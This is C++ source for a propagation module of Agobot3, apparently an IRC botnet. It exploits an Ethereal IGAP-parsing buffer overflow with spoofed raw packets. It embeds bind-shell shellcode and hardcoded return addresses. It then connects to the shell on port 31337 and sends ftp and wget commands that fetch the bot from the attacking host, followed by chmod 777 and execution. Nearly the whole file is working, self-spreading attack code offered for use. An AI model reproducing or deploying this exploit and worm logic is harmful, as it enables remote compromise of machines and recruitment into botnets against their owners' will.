/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#include "utility.h"

#include "scanner.h"

class CScannerEthereal : public CScannerBase
{
public:
	CScannerEthereal();
	virtual ~CScannerEthereal() throw() { }
	bool Exploit();
protected:
	bool ExploitInt(int iOffset);
};

/*
		Ethereal Scanner starts here
*/

#define IPPROTO_IGAP	0x02
#define PAYLOAD_SIZE	(255-64)
#define MAX_BUFF		sizeof(struct igap_header)+sizeof(struct ipheader)
#define MAX_PACKET		10
#define RETOFFSET		76

#define MAX_ARCH		4
struct eos { unsigned long ret; } targets[] = {
	0xbffede10, 0xbfffd560, 0xbffedfb8, 0xbfffcd08, 0 };

char shellcode_firsthalf[] =
	"\x31\xc0\x31\xdb\xb0\x02\xcd\x80\x38\xc3\x74\x05\x8d\x43\x01\xcd"
	"\x80\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x89\x45\x10\x40\x89"
	"\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d\x08\xb0\x66\xcd\x80\x89"
	"\x45\x08";

char jumpcode[] =
	"\xeb\x10";

char shellcode_secondhalf[] =
	"\x43\x66\x89\x5d\x14\x66\xc7\x45\x16\x7a\x69\x31\xd2\x89\x55\x18"
	"\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10\xb0\x66\xcd\x80\x40\x89"
	"\x45\x0c\x43\x43\xb0\x66\xcd\x80\x43\x89\x45\x0c\x89\x45\x10\xb0"
	"\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75"
	"\xf6\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
	"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
	
struct ipheader {
	unsigned char		ip_hl:4, ip_v:4; 
	unsigned char		ip_tos;
	unsigned short int	ip_len;
	unsigned short int	ip_id;
	unsigned short int	ip_off;
	unsigned char		ip_ttl;
	unsigned char		ip_proto;
	unsigned short int	ip_sum;
	unsigned int		ip_src;
	unsigned int		ip_dst; };

struct igap_header {										// This is a malformed header which does not conforms with IGAP RFC
	unsigned char		igap_type;	 						// Message Type
	unsigned char		igap_restime; 						// Response Time
	unsigned short int	igap_cksum; 						// IGAP Message Checksum
	unsigned int		igap_gaddr;	 						// Group Address
	unsigned char		igap_ver; 							// Version
	unsigned char		igap_stype;							// SubType
	unsigned char		igap_reserved1;						// Reserved
	unsigned char		igap_cid;							// Challenge ID
	unsigned char		igap_asize;							// Account Size
	unsigned char		igap_msgsize;						// Message Size
	unsigned short int	igap_reserved2;						// Reserved
/*
	unsigned char		igap_uaccount[16];					// User Account
	unsigned char		igap_message[64];					// Message
*/
	unsigned char		igap_payload[16+64+PAYLOAD_SIZE];	// This buffer will contain payload, here we differ from RFC by sending a bigger message.
};

CScannerEthereal::CScannerEthereal() { m_szType="CScannerEthereal"; m_sScannerName.Assign("Ethereal"); }

bool CScannerEthereal::Exploit() {
	if(!IsPrivate(g_pMainCtrl->m_pIRC->m_sLocalIp.CStr()) && IsPrivate(m_sSocket.m_szHost)) return false;

	// We need root to exploit this cause we need to spoof packets
	if(getuid()) return false;

	ExploitInt(0); ExploitInt(1); ExploitInt(2); ExploitInt(3);
	
	CSocket sShellSocket; if(sShellSocket.Connect(m_sSocket.m_szHost, 31337)) {
		CString sCmdBuf; sShellSocket.RecvTO(sCmdBuf.GetBuffer(8192), 8192, 2000);
		sCmdBuf.Format("echo -e open %s %d\\nuser ftp bla\\nget bot\\nquit\\n | ftp -n\n", g_pMainCtrl->m_pIRC->m_sLocalHost.CStr(), g_pMainCtrl->m_pBot->bot_ftrans_port_ftp.iValue);
		sShellSocket.Write(sCmdBuf.CStr(), sCmdBuf.GetLength()); sShellSocket.Recv(sCmdBuf.GetBuffer(8192), 8192);
		sCmdBuf.Format("wget ftp://bla:bla@%s:%d/bot\n", g_pMainCtrl->m_pIRC->m_sLocalHost.CStr(), g_pMainCtrl->m_pBot->bot_ftrans_port_ftp.iValue);
		sShellSocket.Write(sCmdBuf.CStr(), sCmdBuf.GetLength()); sShellSocket.Recv(sCmdBuf.GetBuffer(8192), 8192);
		sCmdBuf.Assign("chmod 777 ./bot ; ./bla\n");
		sShellSocket.Write(sCmdBuf.CStr(), sCmdBuf.GetLength()); sShellSocket.Recv(sCmdBuf.GetBuffer(8192), 8192);
		sShellSocket.Disconnect(); return true; } else return false; }

bool CScannerEthereal::ExploitInt(int iOffset) {
	char buffer[MAX_BUFF]; ipheader *iphdr=(ipheader*)buffer; igap_header *igaphdr=(igap_header*)(buffer+sizeof(ipheader));
	unsigned long magic=targets[iOffset].ret; CString sRandomIp; int one=1; const int *val=&one; sockaddr_in sin;

	memset(buffer, 0x00, MAX_BUFF); int sockfd=socket(PF_INET, SOCK_RAW, IPPROTO_RAW); if(sockfd==SOCKET_ERROR) return false;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0) { close(sockfd); return false; }
	init_random(); sRandomIp.Format("%d.%d.%d.%d", brandom(0, 255), brandom(0, 255), brandom(0, 255), brandom(0, 255));

	sin.sin_addr.s_addr=inet_addr(m_sSocket.m_szHost); sin.sin_family=AF_INET; sin.sin_port=0x00;
	
	iphdr->ip_hl=0x05; iphdr->ip_v=0x04; iphdr->ip_tos=0x00; iphdr->ip_len=MAX_BUFF; iphdr->ip_id=htonl(54321);
	iphdr->ip_off=0x00; iphdr->ip_ttl=0x01; iphdr->ip_proto=IPPROTO_IGAP; iphdr->ip_sum=0x00;
	iphdr->ip_src=inet_addr(sRandomIp.CStr()); iphdr->ip_dst=inet_addr(m_sSocket.m_szHost);
	if(iphdr->ip_src==SOCKET_ERROR || iphdr->ip_dst==SOCKET_ERROR) { close(sockfd); return false; }

	igaphdr->igap_type=0x41; igaphdr->igap_restime=0x0a; igaphdr->igap_cksum=0x00; igaphdr->igap_gaddr=0x00;
	igaphdr->igap_ver=0x01; igaphdr->igap_stype=0x21; igaphdr->igap_reserved1=0x00; igaphdr->igap_cid=0x00;
	igaphdr->igap_asize=0x10; igaphdr->igap_msgsize=0x40+PAYLOAD_SIZE; igaphdr->igap_reserved2=0x00;

	memset(igaphdr->igap_payload, 0x90, 16+64+PAYLOAD_SIZE);
	memcpy(igaphdr->igap_payload+16+RETOFFSET-strlen(shellcode_firsthalf)-8, shellcode_firsthalf, strlen(shellcode_firsthalf));
	memcpy(igaphdr->igap_payload+16+64+RETOFFSET-strlen(jumpcode)-4, jumpcode, strlen(jumpcode));
	memcpy(igaphdr->igap_payload+16+64+RETOFFSET, &magic, 4); magic-=0x10;
	memcpy(igaphdr->igap_payload+16+64+RETOFFSET-4, &magic, 4);
	memcpy(igaphdr->igap_payload+16+64+PAYLOAD_SIZE-strlen(shellcode_secondhalf)-1, shellcode_secondhalf, strlen(shellcode_secondhalf));

	igaphdr->igap_cksum=checksum((unsigned short*)(buffer+sizeof(struct ipheader)), (sizeof(struct igap_header))>>1);
	iphdr->ip_sum=checksum((unsigned short*)buffer, (iphdr->ip_len)>>1);

	one=MAX_PACKET; while(one) {
		sendto(sockfd, buffer, MAX_BUFF, 0, (sockaddr*)&sin, sizeof(sin)); one--; }
	close(sockfd); return true; }

REGSCANNER(Ethereal_NoPort, Ethereal, 4363, false, true, true)
